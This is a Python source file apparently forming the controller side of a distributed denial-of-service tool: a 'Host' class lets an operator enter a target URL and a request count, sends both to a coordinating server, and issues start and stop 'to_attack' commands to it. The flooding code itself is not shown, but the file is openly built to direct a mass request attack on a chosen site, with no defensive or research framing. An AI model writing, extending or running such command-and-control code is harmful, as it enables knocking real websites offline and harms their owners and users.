import requests as r


def validate_attack_address(attack_address: str) -> bool:
    return attack_address.startswith("http://") or attack_address.startswith("https://")


def validate_requests_amount(num_requests: str) -> bool:
    try:
        int(num_requests)
        return int(num_requests) > 0
    except ValueError:
        return False


class Host:
    def __init__(self, server_address: str) -> None:
        self.server_address = server_address
        self.attack_address, self.num_requests = self._receive_attack_info()

    def set_attack_address(self) -> None:
        print("Enter attack address: ")
        inp = input("> ")

        if validate_attack_address(inp):
            self.attack_address = inp
            self._send_attack_info()
        else:
            print("Invalid attack address")

    def set_requests_amount(self) -> None:
        print("Enter number of requests: ")
        inp = input("> ")

        if validate_requests_amount(inp):
            self.num_requests = int(inp)
            self._send_attack_info()
        else:
            print("Invalid number of requests")

    def _send_attack_info(self) -> None:
        if not (self.attack_address or self.num_requests):
            print("You must set the attack address or number of requests first")
            return

        attack_info = {
            "attack_address": self.attack_address,
            "requests_amount": self.num_requests
        }

        try:
            r.post(
                f"http://{self.server_address}/attack_info",
                json=attack_info
            )
        except r.exceptions.ConnectionError:
            print("Connection to server failed")

    def _receive_attack_info(self) -> tuple:
        try:
            rsp = r.get(f"http://{self.server_address}/attack_info")
        except r.exceptions.ConnectionError:
            print("Connection to server failed")
            return None, None

        if rsp.status_code == 200:
            content = rsp.json()
            try:
                if content["attack_address"] and content["requests_amount"]:
                    return content["attack_address"], int(content["requests_amount"])
                else:
                    return None, None
            except KeyError:
                return None, None
        else:
            return None, None

    def start_attack(self) -> None:
        if not (self.attack_address and self.num_requests):
            print("You must set the attack address and number of requests first")
            return

        try:
            r.post(
                f"http://{self.server_address}/to_attack",
                json={"to_attack": "yes"}
            )
        except r.exceptions.ConnectionError:
            print("Connection to server failed")

    def stop_attack(self) -> None:
        try:
            r.post(
                f"http://{self.server_address}/to_attack",
                json={"to_attack": "no"}
            )
        except r.exceptions.ConnectionError:
            print("Connection to server failed")
